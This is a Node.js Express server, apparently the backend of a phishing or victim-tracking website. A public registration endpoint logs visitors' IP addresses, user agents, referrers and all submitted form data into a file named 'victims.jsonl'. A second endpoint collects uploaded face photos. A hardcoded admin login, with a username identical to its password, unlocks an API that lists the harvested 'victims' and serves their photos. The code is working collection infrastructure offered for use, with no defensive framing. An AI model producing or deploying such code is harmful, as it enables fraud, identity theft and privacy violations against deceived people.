const express = require('express');
const multer  = require('multer');
const path    = require('path');
const fs      = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOAD_DIR = path.join(__dirname, 'uploads');
const DATA_DIR   = path.join(__dirname, 'data');
const LOG_FILE   = path.join(DATA_DIR, 'victims.jsonl');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });
fs.mkdirSync(DATA_DIR,   { recursive: true });

// Tài khoản admin đơn giản
const ADMIN_USER = 'eveujrmx';
const ADMIN_PASS = 'eveujrmx';

// Token tạm để check session (không dùng JWT cho gọn)
const SESSIONS = new Set();

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const ip = getClientIP(req).replace(/[^0-9a-f:.]/gi, '');
    cb(null, `${Date.now()}_${ip}_${Math.random().toString(36).slice(2)}.jpg`);
  }
});
const upload = multer({ storage, limits: { fileSize: 15 * 1024 * 1024 } });

app.set('trust proxy', true);
app.use(express.json({ limit: '3mb' }));

function getClientIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
      || req.socket.remoteAddress;
}

/* ============ API public cho web ============ */
app.post('/register', (req, res) => {
  const rec = {
    time: new Date().toISOString(),
    ip: getClientIP(req),
    ua: req.headers['user-agent'],
    ref: req.headers['referer'],
    data: req.body
  };
  fs.appendFileSync(LOG_FILE, JSON.stringify(rec) + '\n');
  console.log('📝', rec.ip);
  res.json({ ok: true });
});

app.post('/face', upload.single('photo'), (req, res) => {
  if (!req.file) return res.status(400).json({ ok: false });
  fs.appendFileSync(LOG_FILE, JSON.stringify({
    time: new Date().toISOString(),
    ip: getClientIP(req),
    ua: req.headers['user-agent'],
    face: req.file.filename
  }) + '\n');
  console.log('📸', req.file.filename);
  res.json({ ok: true });
});

/* ============ Login API ============ */
app.post('/api/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === ADMIN_USER && pass === ADMIN_PASS) {
    const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
    SESSIONS.add(token);
    return res.json({ ok: true, token });
  }
  res.json({ ok: false });
});

function checkToken(req, res, next) {
  const t = req.headers['x-token'] || req.query.token;
  if (!t || !SESSIONS.has(t)) return res.status(401).json({ ok: false });
  next();
}

/* ============ Admin data API ============ */
app.get('/api/victims', checkToken, (req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.json([]);
  const lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean);
  const recs = lines.map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
  res.json(recs.reverse());
});

app.get('/api/photo/:name', checkToken, (req, res) => {
  const f = path.join(UPLOAD_DIR, path.basename(req.params.name));
  if (!fs.existsSync(f)) return res.status(404).send('not found');
  res.sendFile(f);
});

/* ============ Static ============ */
app.use(express.static(path.join(__dirname, 'public')));

app.get('/health', (req, res) => res.json({ ok: true, t: Date.now() }));

app.listen(PORT, () => console.log(`🌐 http://localhost:${PORT}`));
